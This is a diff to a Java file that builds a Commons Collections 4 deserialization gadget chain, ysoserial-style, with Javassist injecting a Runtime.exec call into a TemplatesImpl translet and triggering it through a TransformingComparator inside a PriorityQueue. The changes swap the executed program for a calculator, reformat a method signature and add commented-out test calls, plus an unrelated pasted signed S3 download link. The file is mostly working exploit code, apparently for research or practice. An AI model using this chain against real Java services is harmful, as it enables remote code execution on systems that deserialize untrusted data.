@@ -148,7 +148,10 @@ public class CommonCollection4 {
         private static final long serialVersionUID = 8207363842866235160L;
     }
 
-    public static <template> void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, CannotCompileException, IOException, NotFoundException, NoSuchFieldException {
+    public static <template> void main(String[] args) throws ClassNotFoundException,
+                                                                IllegalAccessException,
+                                                InstantiationException, CannotCompileException,
+                                                IOException, NotFoundException, NoSuchFieldException {
         Class tplClass =  Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
         Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
         Class transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
@@ -160,7 +163,7 @@ public class CommonCollection4 {
 
         final CtClass clazz = pool.get(CommonCollections2.StubTransletPayload.class.getName());
 
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"FBReader\");";
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"galculator\");";
         clazz.makeClassInitializer().insertAfter(cmd);
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
@@ -182,6 +185,8 @@ public class CommonCollection4 {
         tfactory.setAccessible(true);
         tfactory.set(template, transFactory.newInstance());
 
+//        ((Templates) template).getOutputProperties();
+        //"https://github-production-release-asset-2e65be.s3.amazonaws.com/41199577/f19fc800-a479-11ea-8673-875485405b62?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20200602%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20200602T152042Z&X-Amz-Expires=300&X-Amz-Signature=80d80682017413a021042835f90904ee91f0a089d5f6816bf1ed9e5c3a729894&X-Amz-SignedHeaders=host&actor_id=0&repo_id=41199577&response-content-disposition=attachment%3B%20filename%3DSimplenote-linux-1.17.0-x86_64.AppImage&response-content-type=application%2Foctet-stream"
         /*
         测试 直接调用
          */
@@ -189,6 +194,7 @@ public class CommonCollection4 {
         InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{template});
         ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] {constantTransformer, instantiateTransformer});
         TransformingComparator trans = new TransformingComparator(chainedTransformer);
+//        trans.compare(1, 1);
 
         PriorityQueue priorityQueue = new PriorityQueue(2, trans);
         priorityQueue.add(1);
@@ -227,7 +233,7 @@ public class CommonCollection4 {
 //        instant_field2.setAccessible(true);
 //        instant_field2.set(instantiateTransformer, new Object[]{template});
 //
-//        byte[] b = do_serialize(queue);
+//        byte[] b = do_serialize(priorityQueue);
 //        Object a = do_unserialize(b);
 
 
